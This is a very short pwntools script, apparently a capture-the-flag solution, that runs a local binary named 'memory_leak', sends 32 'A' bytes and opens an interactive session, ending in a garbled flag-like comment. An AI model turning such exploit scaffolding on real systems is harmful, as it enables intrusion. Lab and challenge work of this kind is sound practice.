from pwn import *

p = process('./memory_leak')

payload = 'A' * 0x20

p.send(payload)
p.interactive()

#BCFKRLOT[dBCFKR